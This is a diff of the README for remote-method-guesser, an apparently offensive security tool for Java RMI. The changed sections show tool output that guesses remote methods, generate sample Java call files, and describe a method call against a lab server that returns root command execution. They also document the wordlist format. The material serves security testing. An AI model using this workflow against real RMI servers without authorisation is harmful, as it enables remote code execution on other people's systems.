-[+] 	Method signature: String execute(String dummy)
+[+] 	Method signature: String execute(String dummy).
 [+] 	
-[+] 	Skipping bound name ssl-server
-[+] 	Current bound name plain-server
-[+] 		RMI object tries to connect to different remote host: iinsecure.dev
-[+] 			Redirecting the connection back to 172.18.0.2... 
+[+] 	Current bound name: plain-server.
+[+] 		RMI object tries to connect to different remote host: iinsecure.dev.
+[+] 			Redirecting the connection back to 172.23.0.2... 
 [+] 			This is done for all further requests. This message is not shown again. 
 [+] 		Guessing methods...
 [+]
 [+] 			HIT! Method with signature String execute(String dummy) exists!
 [+] 		
-[+] 	Skipping bound name secure-server
 [+] 
 [+] Listing successfully guessed methods:
-[+] 	•  plain-server
+[+] 	-  plain-server
 [+] 		--> String execute(String dummy)
 [+] 
 [+] Starting creation of sample files:
 [+] 
-[+] 	Creating samples for bound name plain-server
+[+] 	Creating samples for bound name plain-server.
 [+] 		Writing sample file /home/qtc/rmg-samples/plain-server/IPlainServer.java
 [+] 		Writing sample file /home/qtc/rmg-samples/plain-server/execute/execute.java
 ```
 
-As the output above suggests, *remote-method-guesser* created two files for the *remote method*:
-
-1. ``IPlainServer.java``: Contains the interface code that is required for the *RMI call*.
-2. ``execute.java``: Contains the *Java code* that is used for the actual method invocation.
-
-As *remote-method-guesser* cannot know which arguments you want to use for the method call, these are left as ``TODOs`` within the
-generated code:
+For a successful *RMI call* you always need an interface definition and the code for the actual method code
+itself. The interface file created by *remote-method-guesser* (``IPlainServer.java``) can be compiled right
+away, whereas the actual method call (``execute.java``) contains a ``TODO`` for each method argument.
 
 ```java
 [qtc@kali ~]$ grep -A 5 "TODO" /home/qtc/rmg-samples/plain-server/execute/execute.java
@@ -503,16 +533,13 @@ command execution. After making this substitution and compiling the two generate
 [+] The servers response is: uid=0(root) gid=0(root) groups=0(root)
 ```
 
-Other benefits of samples generated by *rmg* are some nice *rmg* features that are already build inside. This includes full *TLS* support, for remote objects
-and the *RMI registry*, as well as automatic target redirection.
-
 
 ### Wordlists Files
 
 -----
 
 *remote-method-guesser* guesses *remote methods* based on a wordlist approach. Corresponding wordlists are shipped within this repository and are contained
-within the [wordlist directory](./wordlists). Wordlists are stored using an optimized  *rmg-internal* format:
+within the [wordlist directory](./wordlists). Wordlists are stored using an optimized *rmg-internal* format:
 
 ```
 <RETURN_VALUE> <METHODNAME>(<ARGUMENTS>); <METHOD_HASH>; <IS_PRIMITIVE>; <IS_VOID>;
@@ -561,7 +588,7 @@ Furthermore, by using the ``--update`` switch during the ``guess`` action, *remo
 boolean example_signature(String test); -8079561808652318592; false; false
 ```
 
-*remote-method-guesser* expects wordlists to be located at ``/opt/remote-method-guesser/wordlists``. If this configuration does not fit for you,
+By default, *remote-method-guesser* expects wordlists to be located at ``/opt/remote-method-guesser/wordlists``. If this configuration does not fit for you,
 you can change the default location within the configuration file. For dynamic changes you can also use the ``--wordlist-file`` and
 ``--wordlist-folder`` options.
 
@@ -581,7 +608,7 @@ As automatically generated sample files contain content that is controlled by th
 it is generally a security risk to compile and execute them. *remote-method-guesser* tries to reduce the risk by applying input filtering to
 the above mentioned components. In some situations, this can be annoying. Especially *bound names* can contain a wide range of different characters
 and most of them are rejected by *rmg* (this is because a whitelist filtering is used, instead of a blacklist). After you reviewed the *bound names*
-and corresponding *remote classes* by using *rmgs* ``enum`` action, you may use the ``--trusted`` switch to disable input filtering during
+and corresponding *remote classes* by using *rmg's* ``enum`` action, you may use the ``--trusted`` switch to disable input filtering during
 sample generation. However, this should only be done after verifying that the remote server does not expose any malicious contents within its
 *bound names* or *remote class names*.
 
@@ -621,4 +648,4 @@ invoking them. Now the community has two powerful tools to engage *RMI servers* 
 Furthermore, the [rmiscout wordlist](./wordlists/rmiscout.txt) was obviously copied from the *rmiscout* project (as you can already tell by the different license agreement).
 Thanks *Jake*, for this awesome wordlist of *remote methods* collected from different *GitHub* repositories.
 
-*Copyright 2020, Tobias Neitzel and the remote-method-guesser contributors.*
+*Copyright 2021, Tobias Neitzel and the remote-method-guesser contributors.*
